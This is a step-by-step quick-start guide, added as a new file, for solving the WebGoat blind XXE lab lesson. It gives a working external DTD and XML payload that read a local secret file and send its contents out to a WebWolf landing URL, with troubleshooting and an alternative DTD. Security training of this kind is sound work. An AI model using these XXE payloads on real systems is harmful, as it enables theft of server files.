@@ -1,0 +1,96 @@
+====================================================================
+BLIND XXE - QUICK START
+====================================================================
+
+Goal: Exfiltrate secret.txt using WebWolf as your server
+
+File: C:\Users\mahad\.webgoat-2025.3\XXE\nooniman\secret.txt
+
+====================================================================
+FASTEST SOLUTION:
+====================================================================
+
+STEP 1: Create DTD on WebWolf
+------------------------------
+
+1. Open: http://127.0.0.1:8002/WebWolf
+
+2. Go to "Files" → Upload new file
+
+3. Name: attack.dtd
+
+4. Content:
+<!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8002/WebWolf/landing?secret=%file;'>">
+%eval;
+%exfil;
+
+5. Upload!
+
+
+STEP 2: Submit XXE to WebGoat
+------------------------------
+
+In WebGoat comment field:
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://127.0.0.1:8002/files/nooniman/attack.dtd">
+  %remote;
+]>
+<comment>
+  <text>Blind XXE</text>
+</comment>
+
+
+STEP 3: Check WebWolf
+----------------------
+
+1. WebWolf → "Incoming requests"
+2. Look for request to /WebWolf/landing
+3. Copy the 'secret' parameter value
+
+
+STEP 4: Submit Secret
+----------------------
+
+1. In WebGoat, post new comment with JUST the secret text
+2. Lesson complete! ✅
+
+====================================================================
+TROUBLESHOOTING:
+====================================================================
+
+❌ No request in WebWolf
+→ Check DTD URL: http://127.0.0.1:8002/files/nooniman/attack.dtd
+→ Replace 'nooniman' with your actual username
+→ Browse to DTD URL to verify it's accessible
+
+❌ Parser error
+→ Try different endpoint: ?data= instead of ?secret=
+→ Use base64 encoding (see full guide)
+
+❌ Empty content
+→ Check file path: C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt
+→ Use forward slashes, not backslashes
+
+====================================================================
+ALTERNATIVE DTD (If above doesn't work):
+====================================================================
+
+<!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8002/landing?content=%file;'>">
+%eval;
+%exfil;
+
+====================================================================
+KEY POINTS:
+====================================================================
+
+✓ DTD must be on WebWolf (your controlled server)
+✓ Use parameter entities (%) not regular entities (&)
+✓ Forward slashes in file paths for file:/// URIs
+✓ Check "Incoming requests" in WebWolf for data
+✓ Submit ONLY the secret value as final comment
+
+====================================================================
